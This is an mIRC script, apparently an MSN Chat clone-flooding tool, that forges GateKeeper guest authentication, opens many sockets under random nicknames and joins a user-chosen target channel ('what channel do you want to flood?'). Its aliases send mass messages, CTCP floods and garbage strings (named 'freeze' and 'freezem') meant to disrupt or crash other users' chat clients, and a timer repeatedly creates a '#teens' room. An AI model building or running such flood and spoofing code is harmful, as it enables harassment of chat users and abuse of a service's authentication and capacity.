;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;START LOCALHOST CONNECTION;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
on *:start:{
  set %floodit $remove($$?="what channel do you want to flood?",$chr(37))
  set %timereply off
  set %find %#computing
  set %guestflood 10
  set %ircvers IRCVERS IRC7 MSN-OCX!7.00.0206.0401 $chr(10)
  set %bot off
  set %icserv 207.68.167.161 6667
  set %guestnum 10
  write -c web.html <OBJECT ID="ChatFrame" CLASSID="CLSID:7a32634b-029c-4836-a023-528983982a49" width="100%" CODEBASE="http://fdl.msn.com/public/chat/msnchat42.cab#Version=7,00,0206,0401">
  write web.html <PARAM NAME="RoomName" VALUE="somewhere">
  write web.html <PARAM NAME="NickName" VALUE="id">
  write web.html <PARAM NAME='BaseURL' VALUE='http://chat.msn.com/'>
  write web.html <PARAM NAME="Server" VALUE="127.0.0.1:6668">
  write web.html </OBJECT>
  unset %ifindsflood %socknick.*
  hmake channels 1000
  .timertitlebar 0 2 titlebarset
  :redo
  var %serverport = $rand(1210,4000)
  if (!$portfree(%serverport)) goto redo
  window -k0 @debug
  socklisten init %serverport
  .timer -m 1 200 server 127.0.0.1 %serverport
  .timer 1 1 localinfo -h
  .timer 1 1 ifinds
  .timer 1 1 sockwrite -n iserv : $+ $me $+ !abc@GateKeeper JOIN :#ial
}
on *:socklisten:init: {
  sockaccept iserv
  sockclose init
  sockwrite -n iserv :ident 001 $me :Welcome $me
  sockwrite -n iserv :ident 002 $me :Your host is IDIRC7, running version 7.00.0206.0401
  sockwrite -n iserv :ident 003 $me :This server was created $asctime
  sockwrite -n iserv :ident 004 $me IDIRC7 2.106.4 aioxz abcdefhiklmnoprstuvxyz
  sockwrite -n iserv :ident 372 $me :** weclome to RyLans MSN chat authentication script **
  sockwrite -n iserv :ident 800 $me 1 0 GateKeeper,NTLM 512 *
}
on *:sockread:iserv: {
  var %read
  sockread %read
  tokenize 32 %read
  if ($1 == JOIN) {
    find $2
    return
  }
  elseif ($sock(id*,1) == $null) {
    if ($1 == NICK) { sockwrite -n $sockname : $+ $me NICK $2 }
    if ($1 == USER) { sockwrite -n $sockname :ident 001 $me :enjoy | ircx }
    return 
  }
  else { sockwrite -n id* $1- }
}
menu @debug {
  clear:clear
}
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;START DIRECTORY CONNECTION;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
alias ifinds {
  if (%ifindsflood == $true) { halt | .timerunset 1 2 unset %ifindsflood }
  set %ifindsflood $true
  .timerunset 1 2 unset %ifindsflood
  window -hpk0 @webloader1
  .echo @debug $dll(nHTMLn,attach,$window(@webloader1).hwnd)
  .echo @debug $dll(nHTMLn,select,$window(@webloader1).hwnd)
  .echo @debug $dll(nHTMLn,navigate,$mircdirweb.html)
  sockopen conifinds 207.68.167.183 6667
}
on *:sockopen:conifinds:{ .timer 0 5 keepfinds | socklisten initifinds 6668 }
on *:socklisten:initifinds:{ sockaccept ifinds | sockclose $sockname }
on *:sockread:ifinds: {
  var %read
  sockread %read
  tokenize 32 %read
  echo @debug ifinds %read
  if ($1 == FINDS) { sockwrite -n conifinds FINDS $chr(37) $+ #somewhere }
  else sockwrite -n conifinds $1-
}
on *:sockclose:ifinds:echo -s ifinds closed
on *:sockread:conifinds: {
  var %read
  sockread %read
  tokenize 32 %read
  if ($2 == 705) && (%705check != on) { halt }
  echo @debug conifinds $1-
  ;if ($2 == 706) || ($2 == 701) || ($2 == 703) || ($2 == 901) { sockclose $sockname | sockclose web* | .echo @debug $dll(nHTMLn,stop,$window(@webloader).hwnd) | halt }
  if ($2 == 702) { create %find | echo -s 4 $+ %find does not exist! creating.. }
  if ($2 == 376) { sockclose ifinds | window -c @webloader1 }
  if ($2 == 642) {
    echo -a $time found user $4-
    if ($input(join $4 in $6 $+ ?,8,$4,test) == $true) {
      if ($input(use webchat?,8,$6,test) == $true) {
        set %openroom $remove($6,$chr(37) $+ $chr(35))
        run iexplore.exe http://chat.msn.ca/chatroom.msnw?rm1= $+ $replace(%openroom,$chr(92) $+ $chr(98),+) $+ &rm= $+ $replace(%openroom,$chr(92) $+ $chr(98),$chr(37) $+ 2520,$chr(0160),$chr(37) $+ 2550))
        unset %openroom
      }
      elseif ($input(dont join too quickly,4)) { join $6 }
    }
  }
  if ($2 == 901) { halt }
  if ($2 == 613) {
    echo -s 4Found Channel in $round($calc(($ticks - %cticks) / 1000),2) second
    window -hpk0 @webloader
    echo @debug $dll(nHTMLn,attach,$window(@webloader).hwnd)
    echo @debug $dll(nHTMLn,select,$window(@webloader).hwnd)
    echo @debug $dll(nHTMLn,navigate,$mircdirweb.html)
    socklisten initichan 6668
    sockopen id $+ $hget(channels,%find) $remove($4,:) $5
    sockmark id $+ $hget(channels,%find) %find
    set %icserv $remove($4,:) $5
  }
  elseif ($1 == AUTH) && ($2 != 705) sockwrite -n ifinds $1-
}
on *:sockclose:conifinds:{ timers off | timercloseifinds 1 1 sockclose ifinds | timerreopenifinds -m 1 1200 ifinds }
alias find {
  set %cticks $ticks
  var %id = $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z)
  hadd channels $1 %id
  if ($sock(id $+ %id)) {
    sockwrite -n id $+ $hget(channels,$1) join $1
    halt
  }
  sockwrite -n conifinds FINDS $1
  set %find $1
}
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;START CHANNEL CONNECTION;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
on *:socklisten:initichan:sockaccept ichan | sockclose $sockname
on *:sockopen:id*:{
  if ($left($me,1) != >) { sockwrite -n $sockname IRCX $lf AUTH GateKeeperPassport I :GKSSP\0#7\0\0\0\0\0\0 }
  else { sockwrite -n $sockname IRCX $lf AUTH GateKeeper I :GKSSP\0#7\0\0\0\0\0\0 }
}
on *:sockread:id*:{
  var %buff
  sockread %buff
  tokenize 32 %buff
  if ($window(@debug) == $null) window -k0 @debug
  if ($2 == 914) || ($2 == PRIVMSG) || ($2 == NOTICE) || ($2 == 473) || ($2 == join) || ($2 == kick) || ($2 == part) || ($2 == quit) || ($2 == 353) || ($2 == knock) { halt }
  echo @debug  $+ $sockname $+  $1-
  if ($1-3 == AUTH GateKeeper S) {
    if ($sock(ichan)) { sockwrite -n ichan $1- | halt }
    else { timer -m 1 100 sockwrite -n ichan $1- | halt }
  }
  elseif ($1-3 == AUTH GateKeeper *) {
    sockwrite -n $sockname USER * "*" "127.0.0.1" : $+ 14i15d $+ $lf nick $me $+ $lf
    sockclose ichan
    echo @debug $dll(nHTMLn,navigate,about:blank)
    halt
  }
  elseif ($2 == 001) && (%guestflood < %guestnum) {
    set %socknick. $+ $sockname $me
    sockwrite -n iserv : $+ $ial($me) NICK :> $+ $read(nicks.txt)
    var %id = $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z)
    hadd channels $sock($sockname).mark %id
    sockopen id $+ $hget(channels,$sock($sockname).mark) %icserv
    sockmark id $+ $hget(channels,$sock($sockname).mark) $sock($sockname).mark
    echo @debug $dll(nHTMLn,navigate,$mircdirweb.html)
    socklisten initichan 6668
    inc %guestflood
  }
  elseif ($2 == 404) { sockwrite -n $sockname join $3 }
  elseif ($2 == 403) || ($2 == 451) || ($2 == 433) || ($2 == 432) || ($2 == 913) { sockclose $sockname }
  elseif ($2 == 432) || ($2 == 910) || ($2 == 465) { sockclose ichan | sockclose $sockname | echo @debug $dll(nHTMLn,navigate,about:blank) | halt }
  elseif ($1 == PING) sockwrite -n $sockname PONG $2
  else sockwrite -n iserv $1-
}
on *:sockread:ichan:{
  var %buff
  sockread %buff
  echo @debug  $+ $sockname $+  %buff
  if (AUTH Gatekeeper S isin %buff) {
    if ($left($me,1) != >) { sockwrite -n id $+ $hget(channels,%find) %buff }
    else {
      var %guestid = 111111111111111111111111 $+ $rand(11111111,99999999)
      var %buff1 = $remove(%buff,$left(%buff,44))
      var %x = $len(%buff1)
      var %y = 0
      var %z = 16
      while (%y <= 16) {
        if ($mid(%buff1,%x,1) == \) { dec %x | inc %z }
        dec %x
        inc %y
      }
      var %guestform = $guestform(%guestid)
      var %a = 1
      while (%a <= 32) {
        if ($mid(%guestform,%a,2) == 00) { var %guest_asc = %guest_asc $+ \0 | inc %a 2 }
        if ($mid(%guestform,%a,2) == 09) { var %guest_asc = %guest_asc $+ \t | inc %a 2 }
        if ($mid(%guestform,%a,2) == 0A) { var %guest_asc = %guest_asc $+ \n | inc %a 2 }
        if ($mid(%guestform,%a,2) == 0D) { var %guest_asc = %guest_asc $+ \r | inc %a 2 }
        if ($mid(%guestform,%a,2) == 20) { var %guest_asc = %guest_asc $+ \b | inc %a 2 }
        if ($mid(%guestform,%a,2) == 2C) { var %guest_asc = %guest_asc $+ \c | inc %a 2 }
        if ($mid(%guestform,%a,2) == 5C) { var %guest_asc = %guest_asc $+ \\ | inc %a 2 }
        else { var %guest_asc = %guest_asc $+ $dehex($mid(%guestform,%a,2)) | inc %a 2 }
      }
      sockwrite -n id $+ $hget(channels,%find) $remove(%buff,$right(%buff,%z)) $+ %guest_asc
    } 
  }
  else halt
}
on *:sockclose:ichan*:echo @debug $sockname just closed
on 1:sockclose:id*:{ echo -a $sockname closed }
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;OTHER STUFF;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
alias guestform {
  return $mid($1,7,2) $+ $mid($1,5,2) $+ $mid($1,3,2) $+ $left($1,2) $+ $mid($1,11,2) $+ $mid($1,9,2) $+ $mid($1,15,2) $+ $mid($1,13,2) $+ $right($1,16)
}
dialog htable {
  title "RyLans Hash Manager"
  size -1 -1 283 123
  option dbu
  button "Close", 1, 2 108 98 12, ok cancel
  list 2, 1 2 100 105, size vsbar
  list 3, 102 2 180 37, size vsbar
  list 4, 102 40 180 85 size vsbar
}
on *:dialog:htable:init:0:{
  var %x = 1
  while (%x <= $hget(0,0).item) {
    did -a htable 2 $hget(%x)
    inc %x
  }
}
on *:dialog:htable:sclick:2:{
  did -r htable 3
  did -r htable 4
  var %x = 1
  while (%x <= $hget($did(htable,2,$did(2).sel),0).item) {
    did -a htable 3 $hget($did(htable,2,$did(2).sel),%x).item
    inc %x
  }
}
on *:dialog:htable:sclick:3:{
  did -ra htable 4 $hget($did(htable,2,$did(2).sel),$did(htable,3,$did(3).sel))
}
alias hashman { dialog -m htable htable }
;;credit to jesse for the passform alias thx;;
alias passform {
  var %ticketdata
  var %profiledata
  %ticketdata = $base($len($$1),10,16)
  %ticketdata = $str(0,$calc(8 - $len(%ticketdata))) $+ %ticketdata $+ $1
  %profiledata = $base($len($$2),10,16)
  %profiledata = $str(0,$calc(8 - $len(%profiledata))) $+ %profiledata $+ $2
  return %ticketdata $+ %profiledata
}
alias findu sockwrite -n conifinds findu $1-
alias create sockwrite -n conifinds CREATE TN $chr(37) $+ $remove($1,$chr(37)) idscript - EN-US 1 id $+ $me 0
alias keepfinds {
  if ($sock(conifinds) != conifinds) { ifinds }
  sockwrite -n conifinds CREATE CP $chr(37) $+ #teens idscript - EN-US 1 0 0
}
on *:input:#:{
  if ($left($1,1) != /) { sockwrite -n id* privmsg $chr(37) $+ %floodit : $+ $1- | halt }
}
raw 352:*:{ sockwrite -n iserv : $+ $6 $+ ! $+ $3 $+ @ $+ $4 JOIN :#ial }
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;ALIASES;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
alias freeze sockwrite -n id* privmsg $chr(37) $+ %floodit $1 : $+ (*)(8)(^)(%)(@)(w)(T)(Y)(U)(I)(P)(I)(L)(K)(H)(G)(F)(D)(Z)(X)(C)(B)(N)(M)(?):[:D:(:):S:P(*)(8)(^)(%)(@)(w)(T)(Y)(U)(I)(P)(I)(L)(K)(H)(G)(F)(D)(Z)(X)(C)(B)(N)(M)(?):[:D:(:):S:P(*)(8)(^)(%)(@)(w)(T)(Y)(U)(I)(P)(I)(L)(K)(H)(G)(F)(D)(Z)(X)(C)(B)(N)(M)(?):[:D:(:):S:P
alias takeout sockwrite -n id* privmsg $chr(37) $+ %floodit $1 : $+ $chr(1) $+ FINGER $+ $chr(1)
alias freezem sockwrite -n id* privmsg $chr(37) $+ %floodit $1 : $+ 1]2]3]4]5]6]7]8]9]10]11]12]13]14]15]1]2]3]4]5]6]7]8]9]10]11]12]13]14]15]1]2]3]4]5]6]7]8]9]10]11]12]13]14]15]
alias do sockwrite -n id* $1-
alias qup {
  var %x = 1
  while (%x <= $sock(id*,0)) {
    echo -a sockwrite -n $sock(id*,%x) mode %socknick. $sock(id*,%x) +h $1
    inc %x
  }
}
alias j sockwrite -n id* join $chr(37) $+ %floodit
alias p sockwrite -n id* part $chr(37) $+ %floodit
alias q sockwrite -n id* quit $replace($1-,$chr(32),$chr(160))
alias whisper sockwrite -n id* whisper $chr(37) $+ %floodit $1 : $+ $2-
alias say sockwrite -n id* privmsg $chr(37) $+ %floodit : $+ $1-
alias m sockwrite -n id* mode $chr(37) $+ %floodit $1-
alias a sockwrite -n id* privmsg $chr(37) $+ %floodit : $+ $chr(1) $+ ACTION $1- $+ $chr(1)
alias ti sockwrite -n id* privmsg $chr(37) $+ %floodit : $+ $chr(1) $+ TIME $+ $chr(1)
alias pi sockwrite -n id* privmsg $chr(37) $+ %floodit : $+ $chr(1) $+ PING $+ $chr(1)
alias ve sockwrite -n id* privmsg $chr(37) $+ %floodit : $+ $chr(1) $+ VERSION $+ $chr(1)
alias fi sockwrite -n id* privmsg $chr(37) $+ %floodit : $+ $chr(1) $+ FINGER $+ $chr(1)
alias hop { sockwrite -n id* part $chr(37) $+ %floodit $lf join $chr(37) $+ %floodit }
alias who { sockwrite -n $sock(id*,$sock(id*,0)) who $chr(37) $+ %floodit }
alias dropsome {
  :start
  var %x = $$?="how many to drop?"
  if (%x > $sock(id*,0)) { goto start }
  var %y = $calc($sock(id*,0) - %x)
  while (%x > %y) {
    sockclose $sock(id*,%x)
    dec %x
  }
}
alias socknum echo -a $sock(id*,0)
alias newnicks {
  var %x = 1
  while (%x <= $sock(id*,0)) {
    sockwrite -n $sock(id*,%x) NICK :> $+ $read(nicks.txt)
    inc %x
  }
}
alias thingy {
  var %x = 1
  while (%x <= $sock(id*,0)) {
    if (%x == $sock(id*,0)) { PRIVMSG $chr(37) $+ %floodit $str(~,%x) ZAP! | break }
    else { sockwrite -n $sock(id*,%x) PRIVMSG $chr(37) $+ %floodit : $+ $str(~,%x) | inc %x }
  }
}
alias bleh {
  window -pk0 @webloader
  .echo @debug $dll(nHTMLn,attach,$window(@webloader).hwnd)
  .echo @debug $dll(nHTMLn,select,$window(@webloader).hwnd)
  .echo @debug $dll(nHTMLn,navigate,$mircdirweb.html)
  .echo @debug $dll(nHTMLn,navigate,about:blank)
}
alias dehex {
  var %str_in = $1
  if ( $right($base($len(%str_in),10,2),1) = 1 ) {
  }
  else {
    while ( %str_in ) {
      var %str_out = %str_out $+ $chr($base($left(%str_in,2),16,10))
      var %str_in = $mid(%str_in,3)
    }
    return %str_out
  }
}
alias hex {
  var %i 1
  var %count $len($$1-)
  var %retme
  while (%i <= %count) {
    %retme = %retme $+ $base($asc($mid($1-,%i,1)),10,16,2)
    inc %i
  }
  return %retme
}
alias more {
  set %guestflood 1
  join $chr(37) $+ %floodit
}
alias titlebarset titlebar $sock(id*,0) open sockets
